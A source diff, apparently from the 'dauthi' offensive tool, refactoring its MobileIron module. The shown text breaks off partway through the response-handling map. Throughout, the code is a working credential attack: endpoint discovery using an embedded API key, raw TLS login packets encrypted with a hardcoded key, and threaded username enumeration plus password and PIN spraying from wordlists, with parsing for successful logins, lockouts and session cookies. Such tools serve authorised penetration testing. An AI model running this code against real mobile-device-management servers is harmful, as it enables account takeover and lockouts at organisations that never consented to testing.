@@ -16,22 +16,24 @@ import (
 	"github.com/andreburgaud/crypt2go/ecb"
 	"github.com/andreburgaud/crypt2go/padding"
 
-	"dauthi/utils"
+	"github.com/mr-pmillz/dauthi/utils"
 )
 
-type mdma struct {
-	opts  utils.ChargeOpts
-	logr  *utils.Logger
-	count int
-	valid bool
-	cycle
+// MDMA ...
+type MDMA struct {
+	Opts  utils.ChargeOpts
+	Logr  *utils.Logger
+	Count int
+	Valid bool
+	Cycle
 }
 
-type cycle struct {
-	buff   *chan bool
-	block  *chan bool
-	length int
-	api    *utils.API
+// Cycle ...
+type Cycle struct {
+	Buff   *chan bool
+	Block  *chan bool
+	Length int
+	API    *utils.API
 }
 
 const (
@@ -49,14 +51,14 @@ const (
 	// Methods are available tool methods
 	Methods = `
   MobileIron Methods:
-    disco                  MobileIron endpoint discovery query
+    Disco                  MobileIron endpoint discovery query
     enum                   MobileIron username validation
     decrypt                Decrypt MobileIron CipherText
-    prof                   Profile the MobileIron provisioning details
-    auth-user              MobileIron user based authentication
-    auth-pin               MobileIron PIN authentication
-    auth-pinpass           MobileIron auth-pinpassword authentication
-    auth-pinuser           MobileIron PIN user based authentication
+    Prof                   Profile the MobileIron provisioning details
+    Auth-user              MobileIron user based authentication
+    Auth-pin               MobileIron PIN authentication
+    Auth-pinpass           MobileIron Auth-pinpassword authentication
+    Auth-pinuser           MobileIron PIN user based authentication
 	`
 
 	ironAPI = `OTY1MzJmZWI2ZjM0NjUzZjQ2MDRkMDY3MTNkNWY3NGQ3MzJlZjlkNA==`
@@ -83,6 +85,12 @@ const (
 		"{{USER}}:{{PASS}}\x00"
 
 	gatewayCustomerAPI = `https://appgw.mobileiron.com/api/v1/gateway/customers/servers?api-key=%s&domain=%s`
+	TCP                = "tcp"
+	authUser           = "Auth-user"
+	authPin            = "Auth-pin"
+	authPinPass        = "Auth-pinpass" //nolint:gosec
+	authPinUser        = "Auth-pinuser"
+	_enum              = "enum"
 )
 
 func encrypt(pt, key []byte) []byte {
@@ -92,7 +100,7 @@ func encrypt(pt, key []byte) []byte {
 	}
 	mode := ecb.NewECBEncrypter(block)
 	padder := padding.NewPkcs7Padding(mode.BlockSize())
-	pt, err = padder.Pad(pt) // padd last block of plaintext if block size less than block cipher size
+	pt, err = padder.Pad(pt) // padd last Block of plaintext if Block size less than Block cipher size
 	if err != nil {
 		panic(err.Error())
 	}
@@ -131,12 +139,12 @@ func inflate(buf []byte) ([]byte, error) {
 
 func int2Byte(num int) []byte {
 	data := new(bytes.Buffer)
-	binary.Write(data, binary.BigEndian, uint32(num))
+	binary.Write(data, binary.BigEndian, uint32(num)) //nolint:gosec
 	return data.Bytes()
 }
 
-// Init mdma with default values and return obj
-func Init(o utils.ChargeOpts) *mdma {
+// Init MDMA with default values and return obj
+func Init(o utils.ChargeOpts) *MDMA {
 	if o.Agent == "" {
 		o.Agent = "MobileIron/OpenSSLWrapper (Dalvik VM)"
 	}
@@ -148,12 +156,12 @@ func Init(o utils.ChargeOpts) *mdma {
 	}
 	log := utils.NewLogger("mobileiron")
 
-	return &mdma{
-		opts:  o,
-		logr:  log,
-		valid: false,
-		cycle: cycle{
-			api: &utils.API{
+	return &MDMA{
+		Opts:  o,
+		Logr:  log,
+		Valid: false,
+		Cycle: Cycle{
+			API: &utils.API{
 				Debug: o.Debug,
 				Log:   log,
 				Proxy: o.Proxy},
@@ -161,29 +169,29 @@ func Init(o utils.ChargeOpts) *mdma {
 	}
 }
 
-// clone() copies an *mdma for process threading
-func (m *mdma) clone() *mdma {
-	clone := Init(m.opts) // assign target
-	clone.cycle.block = m.cycle.block
-	clone.cycle.buff = m.cycle.buff
+// Clone copies an *MDMA for process threading
+func (m *MDMA) Clone() *MDMA {
+	clone := Init(m.Opts) // assign target
+	clone.Cycle.Block = m.Cycle.Block
+	clone.Cycle.Buff = m.Cycle.Buff
 
 	return clone
 }
 
-// Wrapper to parse JSON/XML objects
-func (m *mdma) parser(data interface{}, p string) bool {
+// Parser wrapper to parse JSON/XML objects
+func (m *MDMA) Parser(data interface{}, p string) bool {
 	switch p {
 	case "json":
-		err := m.cycle.api.Resp.ParseJSON(data)
+		err := m.Cycle.API.Resp.ParseJSON(data)
 		if err != nil {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
 			return true
 		}
 
 	case "xml":
-		err := m.cycle.api.Resp.ParseXML(data)
+		err := m.Cycle.API.Resp.ParseXML(data)
 		if err != nil {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
 			return true
 		}
 	}
@@ -191,102 +199,105 @@ func (m *mdma) parser(data interface{}, p string) bool {
 	return false
 }
 
-func (m *mdma) disco() {
-	m.cycle.api.Name = `gatewayCustomerAPI`
-	m.cycle.api.URL = fmt.Sprintf(gatewayCustomerAPI, ironAPI, m.opts.Endpoint)
-	m.cycle.api.Data = ""
-	m.cycle.api.Method = `GET`
-	m.cycle.api.Opts = &map[string]interface{}{
+// Disco ...
+func (m *MDMA) Disco() {
+	m.Cycle.API.Name = `gatewayCustomerAPI`
+	m.Cycle.API.URL = fmt.Sprintf(gatewayCustomerAPI, ironAPI, m.Opts.Endpoint)
+	m.Cycle.API.Data = ""
+	m.Cycle.API.Method = `GET`
+	m.Cycle.API.Opts = &map[string]interface{}{
 		"Header": map[string][]string{
-			"User-Agent": []string{m.opts.Agent}}}
+			"User-Agent": []string{m.Opts.Agent}}}
 
-	m.cycle.api.WebCall()
-	if m.cycle.api.Resp.Status != 200 {
-		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
+	m.Cycle.API.WebCall()
+	if m.Cycle.API.Resp.Status != 200 {
+		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")
 		return
 	}
 
-	m.validate()
+	m.Validate()
 }
 
-func (m *mdma) prof() {
+// Prof ...
+func (m *MDMA) Prof() {
 	data := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
 	data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
-	data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(m.opts.UUID))
+	data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(m.Opts.UUID))
 	data = strings.ReplaceAll(data, "{{USER}}", "")
 	data = strings.ReplaceAll(data, "{{PASS}}", "")
 	data = strings.ReplaceAll(data, "{{PIN}}", "")
 	buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
 	data = strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:]))
 
-	m.cycle.api.Name = m.opts.Method
-	m.cycle.api.URL = m.opts.Endpoint + ":" + m.opts.Port
-	m.cycle.api.Data = ""
-	m.cycle.api.Method = `tcp`
-	m.cycle.api.Opts = &map[string]interface{}{
+	m.Cycle.API.Name = m.Opts.Method
+	m.Cycle.API.URL = m.Opts.Endpoint + ":" + m.Opts.Port
+	m.Cycle.API.Data = ""
+	m.Cycle.API.Method = TCP
+	m.Cycle.API.Opts = &map[string]interface{}{
 		`request`: []string{data}}
-	m.cycle.api.Offset = 1024
+	m.Cycle.API.Offset = 1024
 
-	m.cycle.api.SocketTLSDial()
-	if m.cycle.api.Resp.Body == nil {
-		m.logr.Errorf([]interface{}{m.opts.Endpoint}, "Profile Failure")
+	m.Cycle.API.SocketTLSDial()
+	if m.Cycle.API.Resp.Body == nil {
+		m.Logr.Errorf([]interface{}{m.Opts.Endpoint}, "Profile Failure")
 		return
 	}
 
-	// Identify if buff data is zLib compressed
-	if string(m.cycle.api.Resp.Body[32:34]) == "\x78\x9c" {
-		buf, err := inflate(m.cycle.api.Resp.Body)
+	// Identify if Buff data is zLib compressed
+	if string(m.Cycle.API.Resp.Body[32:34]) == "\x78\x9c" {
+		buf, err := inflate(m.Cycle.API.Resp.Body)
 		if err != nil {
-			if m.opts.Debug > 0 {
-				m.logr.Errorf(nil, "Decompression Error: %v", err)
+			if m.Opts.Debug > 0 {
+				m.Logr.Errorf(nil, "Decompression Error: %v", err)
 				return
 			}
 		} else {
-			m.opts.Cookie = regexp.MustCompile(`cookie=(.*?)\n`).FindStringSubmatch(string(buf))[1]
-			m.opts.UserName = regexp.MustCompile(`userId=(.*?)\n`).FindStringSubmatch(string(buf))[1]
-			m.opts.GUID, _ = strconv.Atoi(regexp.MustCompile(`senderGUID=(.*?)\n`).FindStringSubmatch(string(buf))[1])
+			m.Opts.Cookie = regexp.MustCompile(`cookie=(.*?)\n`).FindStringSubmatch(string(buf))[1]
+			m.Opts.UserName = regexp.MustCompile(`userId=(.*?)\n`).FindStringSubmatch(string(buf))[1]
+			m.Opts.GUID, _ = strconv.Atoi(regexp.MustCompile(`senderGUID=(.*?)\n`).FindStringSubmatch(string(buf))[1])
 		}
 	}
 
-	m.validate()
+	m.Validate()
 }
 
-func (m *mdma) auth() {
+// Auth ...
+func (m *MDMA) Auth() {
 	var file []byte
 	var err error
 
-	if m.opts.File != "" {
-		file, err = utils.ReadFile(m.opts.File)
+	if m.Opts.File != "" {
+		file, err = utils.ReadFile(m.Opts.File)
 		if err != nil {
-			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
+			m.Logr.Fatalf([]interface{}{m.Opts.File}, "File Read Failure")
 		}
 	}
 
 	lines := strings.Split(string(file), "\n")
-	block := make(chan bool, m.opts.Threads)
+	block := make(chan bool, m.Opts.Threads)
 	buff := make(chan bool, len(lines))
-	m.cycle.block = &block
-	m.cycle.buff = &buff
-	m.cycle.length = len(lines)
+	m.Cycle.Block = &block
+	m.Cycle.Buff = &buff
+	m.Cycle.Length = len(lines)
 
-	m.logr.Infof([]interface{}{m.opts.Method}, "threading %d values across %d threads", m.cycle.length, m.opts.Threads)
+	m.Logr.Infof([]interface{}{m.Opts.Method}, "threading %d values across %d threads", m.Cycle.Length, m.Opts.Threads)
 
 	for _, line := range lines {
 		if len(lines) > 1 && line == "" {
-			*m.cycle.buff <- true
+			*m.Cycle.Buff <- true
 			continue
 		}
 
-		target := m.clone()
+		target := m.Clone()
 
-		switch m.opts.Method {
-		case "auth-user", "enum":
+		switch m.Opts.Method {
+		case authUser, _enum:
 			if line != "" {
-				target.opts.UserName = line
+				target.Opts.UserName = line
 			}
 			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
 			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
-			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.opts.UUID))
+			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.Opts.UUID))
 			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
 			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
 			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
@@ -294,36 +305,36 @@ func (m *mdma) auth() {
 
 			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", userAuthOP)
 			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
-			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.opts.UUID))
-			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.UserName), []byte(ironKey))))+"\r\n")
-			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.Password), []byte(ironKey))))+"\r\n")
+			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.Opts.UUID))
+			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.UserName), []byte(ironKey))))+"\r\n")
+			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.Password), []byte(ironKey))))+"\r\n")
 			d2 = strings.ReplaceAll(d2, "{{PIN}}", "")
 			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)
 
-			target.cycle.api.Name = m.opts.Method
-			target.cycle.api.URL = target.opts.Endpoint + ":" + target.opts.Port
-			target.cycle.api.Data = ""
-			target.cycle.api.Method = `tcp`
-			target.cycle.api.Opts = &map[string]interface{}{
+			target.Cycle.API.Name = m.Opts.Method
+			target.Cycle.API.URL = target.Opts.Endpoint + ":" + target.Opts.Port
+			target.Cycle.API.Data = ""
+			target.Cycle.API.Method = TCP
+			target.Cycle.API.Opts = &map[string]interface{}{
 				`request`: []string{
 					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
 					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
-			target.cycle.api.Offset = 167
+			target.Cycle.API.Offset = 167
 
-			if m.opts.Method == "enum" {
-				for target.count = 0; target.count < 6; target.count++ {
-					target.thread()
+			if m.Opts.Method == _enum {
+				for target.Count = 0; target.Count < 6; target.Count++ {
+					target.Thread()
 				}
 				continue
 			}
 
-		case "auth-pin":
+		case authPin:
 			if line != "" {
-				target.opts.PIN = line
+				target.Opts.PIN = line
 			}
 			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
 			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
-			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.opts.UUID))
+			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.Opts.UUID))
 			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
 			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
 			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
@@ -331,29 +342,29 @@ func (m *mdma) auth() {
 
 			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinAuthOP)
 			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
-			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.opts.UUID))
+			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.Opts.UUID))
 			d2 = strings.ReplaceAll(d2, "{{USER}}", "")
 			d2 = strings.ReplaceAll(d2, "{{PASS}}", "")
-			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.PIN), []byte(ironKey))))+"\r\n")
+			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.PIN), []byte(ironKey))))+"\r\n")
 			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)
 
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = target.opts.Endpoint + ":" + target.opts.Port
-			target.cycle.api.Data = ""
-			target.cycle.api.Method = `tcp`
-			target.cycle.api.Opts = &map[string]interface{}{
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = target.Opts.Endpoint + ":" + target.Opts.Port
+			target.Cycle.API.Data = ""
+			target.Cycle.API.Method = TCP
+			target.Cycle.API.Opts = &map[string]interface{}{
 				`request`: []string{
 					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
 					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
-			target.cycle.api.Offset = 167
+			target.Cycle.API.Offset = 167
 
-		case "auth-pinpass":
+		case authPinPass:
 			if line != "" {
-				target.opts.PIN = line
+				target.Opts.PIN = line
 			}
 			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
 			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
-			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.opts.UUID))
+			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.Opts.UUID))
 			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
 			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
 			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
@@ -361,193 +372,190 @@ func (m *mdma) auth() {
 
 			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinPassAuthOP)
 			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
-			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.opts.UUID))
-			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.UserName), []byte(ironKey))))+"\r\n")
-			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.Password), []byte(ironKey))))+"\r\n")
-			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.PIN), []byte(ironKey))))+"\r\n")
+			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.Opts.UUID))
+			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.UserName), []byte(ironKey))))+"\r\n")
+			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.Password), []byte(ironKey))))+"\r\n")
+			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.PIN), []byte(ironKey))))+"\r\n")
 			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)
 
-			target.cycle.api.Name = m.opts.Method
-			target.cycle.api.URL = m.opts.Endpoint + ":" + m.opts.Port
-			target.cycle.api.Data = ""
-			target.cycle.api.Method = `tcp`
-			target.cycle.api.Opts = &map[string]interface{}{
+			target.Cycle.API.Name = m.Opts.Method
+			target.Cycle.API.URL = m.Opts.Endpoint + ":" + m.Opts.Port
+			target.Cycle.API.Data = ""
+			target.Cycle.API.Method = TCP
+			target.Cycle.API.Opts = &map[string]interface{}{
 				`request`: []string{
 					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
 					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
-			target.cycle.api.Offset = 167
+			target.Cycle.API.Offset = 167
 
-		case "auth-pinuser":
+		case authPinUser:
 			if line != "" {
-				target.opts.UserName = line
+				target.Opts.UserName = line
 			}
-			d1 := strings.ReplaceAll(pinInit, "{{UUID}}", strings.ToLower(target.opts.UUID))
-			d1 = strings.ReplaceAll(d1, "{{GUID}}", string(int2Byte(target.opts.GUID)))
-			d1 = strings.ReplaceAll(d1, "{{COOKIE}}", target.opts.Cookie)
+			d1 := strings.ReplaceAll(pinInit, "{{UUID}}", strings.ToLower(target.Opts.UUID))
+			d1 = strings.ReplaceAll(d1, "{{GUID}}", string(int2Byte(target.Opts.GUID)))
+			d1 = strings.ReplaceAll(d1, "{{COOKIE}}", target.Opts.Cookie)
 			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)
 
-			d2 := strings.ReplaceAll(rawAuth, "{{GUID}}", string(int2Byte(target.opts.GUID)))
-			d2 = strings.ReplaceAll(d2, "{{USER}}", target.opts.UserName)
-			d2 = strings.ReplaceAll(d2, "{{PASS}}", target.opts.Password)
+			d2 := strings.ReplaceAll(rawAuth, "{{GUID}}", string(int2Byte(target.Opts.GUID)))
+			d2 = strings.ReplaceAll(d2, "{{USER}}", target.Opts.UserName)
+			d2 = strings.ReplaceAll(d2, "{{PASS}}", target.Opts.Password)
 			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)
 
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = target.opts.Endpoint + ":" + target.opts.Port
-			target.cycle.api.Data = ""
-			target.cycle.api.Method = `tcp`
-			target.cycle.api.Opts = &map[string]interface{}{
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = target.Opts.Endpoint + ":" + target.Opts.Port
+			target.Cycle.API.Data = ""
+			target.Cycle.API.Method = TCP
+			target.Cycle.API.Opts = &map[string]interface{}{
 				`request`: []string{
 					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
 					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
-			target.cycle.api.Offset = 167
-
+			target.Cycle.API.Offset = 167
 		}
-
-		target.thread()
+		target.Thread()
 	}
 
-	for i := 0; i < m.cycle.length; i++ {
-		<-*m.cycle.buff
+	for i := 0; i < m.Cycle.Length; i++ {
+		<-*m.Cycle.Buff
 	}
-	close(*m.cycle.block)
-	close(*m.cycle.buff)
+	close(*m.Cycle.Block)
+	close(*m.Cycle.Buff)
 }
 
-// thread represents the threading process to loop multiple requests
-func (m *mdma) thread() {
-	*m.cycle.block <- true
+// Thread represents the threading process to loop multiple requests
+func (m *MDMA) Thread() {
+	*m.Cycle.Block <- true
 	go func() {
-		if m.valid {
-			<-*m.cycle.block
+		if m.Valid {
+			<-*m.Cycle.Block
 			return
 		}
 
-		m.api.SocketTLSDial()
-		if m.api.Resp.Status != 200 {
-			if m.opts.Miss < m.opts.Retry {
-				m.opts.Miss++
-				m.logr.Infof([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Retrying Request")
-				<-*m.cycle.block
-				m.thread()
+		m.API.SocketTLSDial()
+		if m.API.Resp.Status != 200 {
+			if m.Opts.Miss < m.Opts.Retry {
+				m.Opts.Miss++
+				m.Logr.Infof([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Retrying Request")
+				<-*m.Cycle.Block
+				m.Thread()
 				return
 			}
-			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, m.opts.PIN, m.opts.GUID, m.opts.Cookie}, "Null Server Response")
+			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, m.Opts.PIN, m.Opts.GUID, m.Opts.Cookie}, "Null Server Response")
 		}
-		m.validate()
+		m.Validate()
 
-		// Sleep interval through thread loop
-		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)
-		<-*m.cycle.block
-		*m.cycle.buff <- true
+		// Sleep interval through Thread loop
+		time.Sleep(time.Duration(m.Opts.Sleep) * time.Second)
+		<-*m.Cycle.Block
+		*m.Cycle.Buff <- true
 	}()
 }
 
-// result takes a byte array and validates the MobileIron response
-func (m *mdma) validate() {
-	switch m.opts.Method {
-	case "disco":
+// Validate result takes a byte array and validates the MobileIron response
+func (m *MDMA) Validate() {
+	switch m.Opts.Method {
+	case "Disco":
 		var check struct {
 			Result struct {
 				HostName string `json:"hostName"`
 				Domain   string `json:"domain"`
 			} `json:"result"`
 		}
-		if m.parser(&check, "json") {
+		if m.Parser(&check, "json") {
 			return
 		}
 
 		if check.Result.Domain != "" {
-			m.logr.Successf([]interface{}{check.Result.HostName}, "Endpoint Discovery")
+			m.Logr.Successf([]interface{}{check.Result.HostName}, "Endpoint Discovery")
 			return
 		}
-		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
+		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")
 
-	case "prof", "auth-user", "enum", "auth-pin", "auth-pinpass", "auth-pinuser":
+	case "Prof", authUser, _enum, authPin, authPinPass, authPinUser:
 		type action struct {
 			name string
 			pre  []interface{}
 			post []interface{}
 		}
-		if strings.Contains(string(m.cycle.api.Resp.Body[32:35]), "\x00\x1d\x01") {
-			if m.opts.Debug > 0 {
-				m.logr.Infof([]interface{}{m.opts.Method}, "Initialization Successful")
+		if strings.Contains(string(m.Cycle.API.Resp.Body[32:35]), "\x00\x1d\x01") {
+			if m.Opts.Debug > 0 {
+				m.Logr.Infof([]interface{}{m.Opts.Method}, "Initialization Successful")
 			}
-		} else if strings.Contains(string(m.cycle.api.Resp.Body[:2]), "\x00\x00") {
-			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Null Response")
+		} else if strings.Contains(string(m.Cycle.API.Resp.Body[:2]), "\x00\x00") {
+			m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Null Response")
 		}
 
 		msg := map[string]action{
-			"\x00\x1d\x01\x1b\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"User Authentication Endabled"}},
-			"\x00\x1d\x01\x16\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN Authentication Enabled"}},
-			"\x00\x1d\x01\x2f\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
-			"\x00\x1d\x01\x2d\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
-			"\x00\x1d\x01\x1a\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"User Authentication + Mutual Certificate Enabled"}},
-			"\x00\x1d\x01\x2e\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN Authentication + Mutual Certificate Authentication Enabled"}},
-			"\x00\x1d\x01\x15\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN-Password + Mutual Certificate Authentication Enabled"}},
-			"\x00\x1d\x00\x32\x00\x00\x01\x93":     action{"fail", []interface{}{m.opts.UserName, m.opts.Password, m.opts.PIN}, []interface{}{"Authentication Failure: %s", m.cycle.api.Resp.Body[42:167]}},
-			"\x00\x1d\x00\x64\x00\x00\x01\x93":     action{"success", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Authentication Successful"}},
-			"\x78\x9c\xbd":                         action{"success", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Authentication Successful - Configuration Received"}},
-			"\x00\x1d\x00\x4c\x00\x00\x01\x93":     action{"info", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Account Lockout: %s", m.cycle.api.Resp.Body[42:167]}},
-			"\x00\x1d\x00\x4b\x00\x00\x01\x93":     action{"info", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Account Lockout: %s", m.cycle.api.Resp.Body[42:167]}},
-			"\x00\x1d\x00\x84\x00":                 action{"fail", []interface{}{m.opts.Endpoint}, []interface{}{"Device Unregistered: %s", m.cycle.api.Resp.Body[42:167]}},
-			"\x00\x00\x00\x53\x00":                 action{"fail", []interface{}{m.opts.Endpoint}, []interface{}{"Unknown Client ID: %s", m.cycle.api.Resp.Body[38:167]}},
-			"\x00\x1d\x00\x1b\x00\x00\x01\x90\x00": action{"fail", []interface{}{m.opts.Endpoint}, []interface{}{"Submission Failure: %s", m.cycle.api.Resp.Body[42:167]}},
+			"\x00\x1d\x01\x1b\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"User Authentication Endabled"}},
+			"\x00\x1d\x01\x16\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN Authentication Enabled"}},
+			"\x00\x1d\x01\x2f\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
+			"\x00\x1d\x01\x2d\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
+			"\x00\x1d\x01\x1a\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"User Authentication + Mutual Certificate Enabled"}},
+			"\x00\x1d\x01\x2e\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN Authentication + Mutual Certificate Authentication Enabled"}},
+			"\x00\x1d\x01\x15\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN-Password + Mutual Certificate Authentication Enabled"}},
+			"\x00\x1d\x00\x32\x00\x00\x01\x93":     action{"fail", []interface{}{m.Opts.UserName, m.Opts.Password, m.Opts.PIN}, []interface{}{"Authentication Failure: %s", m.Cycle.API.Resp.Body[42:167]}},
+			"\x00\x1d\x00\x64\x00\x00\x01\x93":     action{"success", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Authentication Successful"}},
+			"\x78\x9c\xbd":                         action{"success", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Authentication Successful - Configuration Received"}},
+			"\x00\x1d\x00\x4c\x00\x00\x01\x93":     action{"info", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Account Lockout: %s", m.Cycle.API.Resp.Body[42:167]}},
+			"\x00\x1d\x00\x4b\x00\x00\x01\x93":     action{"info", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Account Lockout: %s", m.Cycle.API.Resp.Body[42:167]}},
+			"\x00\x1d\x00\x84\x00":                 action{"fail", []interface{}{m.Opts.Endpoint}, []interface{}{"Device Unregistered: %s", m.Cycle.API.Resp.Body[42:167]}},
+			"\x00\x00\x00\x53\x00":                 action{"fail", []interface{}{m.Opts.Endpoint}, []interface{}{"Unknown Client ID: %s", m.Cycle.API.Resp.Body[38:167]}},
